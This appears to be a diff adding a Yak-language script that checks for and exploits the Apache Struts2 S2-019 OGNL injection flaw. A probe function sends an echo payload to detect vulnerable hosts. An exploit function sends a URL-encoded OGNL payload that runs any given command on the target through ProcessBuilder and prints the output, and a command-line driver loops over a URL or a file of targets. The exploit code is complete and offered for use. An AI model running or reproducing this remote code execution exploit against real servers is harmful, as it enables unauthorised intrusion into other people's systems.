@@ -1,0 +1,75 @@
+
+
+//定义检测函数
+func poc(url){
+
+    random_str = randstr(8)
+
+    payload = `debug=command&expression=%23p%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter()%2c%23p.println(%22`+ random_str +`%22)%2c%23p.close()`
+
+    
+    req, err = http.Post(
+        url,
+        http.useragent(http.uarand()),
+        http.header("Content-Type","application/x-www-form-urlencoded"),
+        http.body(payload),
+    )
+    if err != nil {
+        return
+    }
+    if re.Match(random_str,http.GetAllBody(req)){
+        log.warn( url + " S2_019 found !!!")
+    }else{
+        log.debug(url + " S2_019 safe !!!")
+    }
+    
+}
+
+
+//定义利用函数
+func exp(url,cmd){
+
+
+    // payload = `debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28``%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A`
+    payload = `debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28new+java.lang.String[]{'`+str.Join(str.Split(cmd," "),"','")+`'} %29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A`
+    // println(payload)
+    req, err = http.Post(
+        url,
+        http.useragent(http.uarand()),
+        http.header("Content-Type","application/x-www-form-urlencoded"),
+        http.body(payload),
+        )
+    println(string(http.GetAllBody(req)))
+   // http.show(req)
+}
+
+
+if YAK_MAIN {
+    loglevel("info")
+    u = cli.String("u")
+    file = cli.LineDict("f")
+    cmd = cli.String("cmd")
+
+    if u == "" && len(file)<1 {
+        log.info("you need input target -u or -f")
+        return
+    }
+
+    if u != ""{
+        if cmd != ""{
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+        return
+    }
+
+    for _,u = range file {
+         if cmd != "" {
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+    }
+
+}
